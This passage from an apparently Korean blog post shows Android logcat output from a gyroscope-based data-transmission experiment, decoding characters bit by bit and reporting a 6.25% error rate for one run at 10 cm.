  2023-06-21 15:55:30.970  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 15:55:30.970  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 15:55:31.619  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:32.269  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:55:32.919  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:33.580  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:34.229  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:34.890  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:35.540  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:55:36.199  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:55:36.850  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:55:36.901  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 01000011 = 67(C)
  2023-06-21 15:55:36.941  3194-3194  SH                      com.example.gyroscope                E  C
  2023-06-21 15:55:38.900  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 12
  2023-06-21 15:55:39.549  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 13 12
  2023-06-21 15:55:39.549  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 13
  2023-06-21 15:55:40.149  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 12
  2023-06-21 15:55:40.750  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 15:55:40.750  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 15:55:41.409  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:42.060  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:55:42.730  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:43.390  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:55:44.039  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:44.690  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:55:45.349  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:45.999  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:55:46.649  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:46.699  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 01010101 = 85(U)
  2023-06-21 15:55:46.719  3194-3194  SH                      com.example.gyroscope                E  U
  2023-06-21 15:55:48.700  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 12
  2023-06-21 15:55:49.349  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 13 12
  2023-06-21 15:55:49.350  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 13
  2023-06-21 15:55:49.950  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 12
  2023-06-21 15:55:50.550  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 15:55:50.550  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 15:55:51.200  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:51.850  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:55:52.500  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:53.149  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:55:53.809  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:54.460  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:55.120  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:55:55.770  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:55:56.421  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:55:56.470  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 01010010 = 82(R)
  2023-06-21 15:55:56.517  3194-3194  SH                      com.example.gyroscope                E  R
  2023-06-21 15:55:58.522  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 13
  2023-06-21 15:55:59.170  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 13 13
  2023-06-21 15:55:59.170  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 13
  2023-06-21 15:55:59.770  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 12
  2023-06-21 15:56:00.379  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 15:56:00.379  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 15:56:01.030  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:56:01.679  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:56:02.329  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:56:02.990  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:56:03.640  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:56:04.300  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:56:04.951  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:56:05.599  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:56:06.250  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:56:06.300  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 00110001 = 49(1)
  2023-06-21 15:56:06.336  3194-3194  SH                      com.example.gyroscope                E  1
  2023-06-21 15:56:08.300  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 12
  2023-06-21 15:56:08.951  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 13 12
  2023-06-21 15:56:08.951  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 13
  2023-06-21 15:56:09.561  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 12
  2023-06-21 15:56:10.161  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 15:56:10.161  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 15:56:10.810  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:56:11.460  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:56:12.110  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:56:12.759  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:56:13.419  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:56:14.070  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:56:14.720  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:56:15.370  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:56:16.029  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:56:16.080  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 00110111 = 55(7)
  2023-06-21 15:56:16.119  3194-3194  SH                      com.example.gyroscope                E  7
  2023-06-21 15:56:18.080  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 12
  2023-06-21 15:56:18.729  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 13 12
  2023-06-21 15:56:18.729  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 13
  2023-06-21 15:56:19.330  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 12
  2023-06-21 15:56:19.929  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 15:56:19.929  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 15:56:20.580  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:56:21.230  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:56:21.880  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:56:22.530  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:56:23.180  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:56:23.830  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:56:24.480  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:56:25.130  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:56:25.780  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:56:25.830  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 01011001 = 89(Y)
  2023-06-21 15:56:25.866  3194-3194  SH                      com.example.gyroscope                E  Y
  2023-06-21 15:56:27.880  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 12
  2023-06-21 15:56:28.529  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 13 12
  2023-06-21 15:56:28.529  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 13
  2023-06-21 15:56:29.130  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 12
  2023-06-21 15:56:29.729  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 15:56:29.729  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 15:56:30.380  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:56:31.029  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:56:31.690  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:56:32.339  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:56:33.000  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:56:33.649  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:56:34.300  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:56:34.949  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 15:56:35.601  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 15:56:35.650  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 00100001 = 33(!)
  2023-06-21 15:56:35.694  3194-3194  SH                      com.example.gyroscope                E  !
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;10cm 거리에서 N37WORk53CUR17Y! 를 전송한 결과 (2회차) - 에러율 6.25% 정확도 93.75%&lt;/p&gt;

    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  2023-06-21 16:06:18.370  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 12
  2023-06-21 16:06:18.970  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 12 12
  2023-06-21 16:06:18.970  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 12
  2023-06-21 16:06:19.619  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 13
  2023-06-21 16:06:20.220  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 16:06:20.220  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 16:06:20.871  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:06:21.521  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:06:22.180  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:06:22.830  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:06:23.480  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:06:24.139  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:06:24.790  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:06:25.439  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:06:26.090  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:06:26.139  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 01001110 = 78(N)
  2023-06-21 16:06:26.173  3194-3194  SH                      com.example.gyroscope                E  N
  2023-06-21 16:06:28.189  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 13
  2023-06-21 16:06:28.790  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 12 13
  2023-06-21 16:06:28.790  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 12
  2023-06-21 16:06:29.390  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 12
  2023-06-21 16:06:29.990  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 16:06:29.990  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 16:06:30.639  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:06:31.289  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:06:31.939  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:06:32.599  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:06:33.259  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:06:33.909  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:06:34.560  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:06:35.209  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:06:35.870  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:06:35.920  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 00110011 = 51(3)
  2023-06-21 16:06:35.967  3194-3194  SH                      com.example.gyroscope                E  3
  2023-06-21 16:06:37.980  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 13
  2023-06-21 16:06:38.580  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 12 13
  2023-06-21 16:06:38.580  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 12
  2023-06-21 16:06:39.230  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 13
  2023-06-21 16:06:39.830  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 16:06:39.830  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 16:06:40.480  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:06:41.130  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:06:41.779  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:06:42.430  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:06:43.080  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:06:43.729  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:06:44.381  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:06:45.030  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:06:45.680  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:06:45.730  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 00110111 = 55(7)
  2023-06-21 16:06:45.772  3194-3194  SH                      com.example.gyroscope                E  7
  2023-06-21 16:06:47.740  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 12
  2023-06-21 16:06:48.389  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 13 12
  2023-06-21 16:06:48.389  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 13
  2023-06-21 16:06:49.040  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 13
  2023-06-21 16:06:49.640  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 16:06:49.640  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 16:06:50.290  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:06:50.940  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:06:51.589  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:06:52.239  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:06:52.891  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:06:53.539  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:06:54.193  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:06:54.839  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:06:55.500  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:06:55.550  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 01010111 = 87(W)
  2023-06-21 16:06:55.582  3194-3194  SH                      com.example.gyroscope                E  W
  2023-06-21 16:06:57.561  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 12
  2023-06-21 16:06:58.210  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 13 12
  2023-06-21 16:06:58.210  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 13
  2023-06-21 16:06:58.810  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 12
  2023-06-21 16:06:59.410  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 16:06:59.410  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 16:07:00.059  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:00.720  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:01.380  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:07:02.029  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:07:02.679  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:03.339  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:03.990  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:04.639  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:05.290  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:05.341  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 00110000 = 48(0)
  2023-06-21 16:07:05.378  3194-3194  SH                      com.example.gyroscope                E  0
  2023-06-21 16:07:07.360  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 12
  2023-06-21 16:07:08.010  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 13 12
  2023-06-21 16:07:08.010  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 13
  2023-06-21 16:07:08.610  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 12
  2023-06-21 16:07:09.209  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 16:07:09.210  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 16:07:09.859  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:10.510  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:07:11.159  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:11.813  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:07:12.470  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:13.119  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:13.769  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:07:14.429  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:15.089  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:07:15.139  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 01010010 = 82(R)
  2023-06-21 16:07:15.164  3194-3194  SH                      com.example.gyroscope                E  R
  2023-06-21 16:07:17.160  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 12
  2023-06-21 16:07:17.810  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 13 12
  2023-06-21 16:07:17.810  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 13
  2023-06-21 16:07:18.419  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 12
  2023-06-21 16:07:19.019  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 16:07:19.019  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 16:07:19.670  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:20.319  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:07:20.970  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:07:21.620  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:22.270  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:07:22.930  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:23.579  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:07:24.229  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:07:24.879  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:07:24.929  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 01101011 = 107(k)
  2023-06-21 16:07:24.957  3194-3194  SH                      com.example.gyroscope                E  k
  2023-06-21 16:07:26.949  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 12
  2023-06-21 16:07:27.600  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 13 12
  2023-06-21 16:07:27.600  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 13
  2023-06-21 16:07:28.250  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 13
  2023-06-21 16:07:28.851  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 16:07:28.851  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 16:07:29.500  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:30.149  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:30.800  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:07:31.450  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:32.099  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:32.750  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:33.399  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:34.049  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:34.700  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:34.750  3194-3194  SH                      com.example.gyroscope                E  Parity Check Failed
  2023-06-21 16:07:34.752  3194-3194  SH                      com.example.gyroscope                E  parseMessage: 
  2023-06-21 16:07:34.755  3194-3194  SH                      com.example.gyroscope                E  parseMessage: 
  2023-06-21 16:07:34.756  3194-3194  SH                      com.example.gyroscope                D  parseMessage:  = 0(??)
  2023-06-21 16:07:34.796  3194-3194  SH                      com.example.gyroscope                E  ??
  2023-06-21 16:07:36.760  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 12
  2023-06-21 16:07:37.359  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 12 12
  2023-06-21 16:07:37.360  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 12
  2023-06-21 16:07:38.009  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 13
  2023-06-21 16:07:38.610  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 16:07:38.610  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 16:07:39.260  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:39.919  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:40.570  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:07:41.220  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:07:41.870  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:42.520  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:07:43.169  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:43.819  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:07:44.470  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:44.521  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 00110101 = 53(5)
  2023-06-21 16:07:44.546  3194-3194  SH                      com.example.gyroscope                E  5
  2023-06-21 16:07:46.570  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 12
  2023-06-21 16:07:47.221  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 13 12
  2023-06-21 16:07:47.221  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 13
  2023-06-21 16:07:47.821  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 12
  2023-06-21 16:07:48.419  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 16:07:48.419  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 16:07:49.070  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:49.720  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:50.370  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:07:51.020  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:07:51.670  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:52.320  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:52.970  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:07:53.620  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:07:54.269  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:54.319  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 00110011 = 51(3)
  2023-06-21 16:07:54.336  3194-3194  SH                      com.example.gyroscope                E  3
  2023-06-21 16:07:56.380  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 13
  2023-06-21 16:07:57.029  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 13 13
  2023-06-21 16:07:57.029  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 13
  2023-06-21 16:07:57.630  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 12
  2023-06-21 16:07:58.230  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 16:07:58.230  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 16:07:58.880  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:07:59.530  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:08:00.180  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:08:00.830  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:08:01.490  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:08:02.139  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:08:02.789  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:08:03.439  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:08:04.089  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:08:04.139  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 01000011 = 67(C)
  2023-06-21 16:08:04.157  3194-3194  SH                      com.example.gyroscope                E  C
  2023-06-21 16:08:06.199  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 13
  2023-06-21 16:08:06.800  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 12 13
  2023-06-21 16:08:06.800  3194-3194  SH                      com.example.gyroscope                D  preamble: 1, len 12
  2023-06-21 16:08:07.410  3194-3194  SH                      com.example.gyroscope                D  preamble: 2, len 12
  2023-06-21 16:08:08.010  3194-3194  SH                      com.example.gyroscope                D  bitlen : 13
  2023-06-21 16:08:08.010  3194-3194  SH                      com.example.gyroscope                D  DEMODULATE
  2023-06-21 16:08:08.660  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:08:09.310  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:08:09.959  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:08:10.610  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:08:11.260  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:08:11.909  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:08:12.570  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:08:13.219  3194-3194  SH                      com.example.gyroscope                D  new bit1
  2023-06-21 16:08:13.870  3194-3194  SH                      com.example.gyroscope                D  new bit0
  2023-06-21 16:08:13.920  3194-3194  SH                      com.example.gyroscope                D  parseMessage: 01010101 = 85(U)
  2023-06-21 16:08:13.937  3194-3194  SH                      com.example.gyroscope                E  U
  2023-06-21 16:08:15.920  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 12
  2023-06-21 16:08:16.620  3194-3194  SH                      com.example.gyroscope                D  tempbitlen: 14 12
  2023-06-21 16:08:17.230  3194-3194  SH                      com.example.gyroscope                D  preamble: 0, len 12
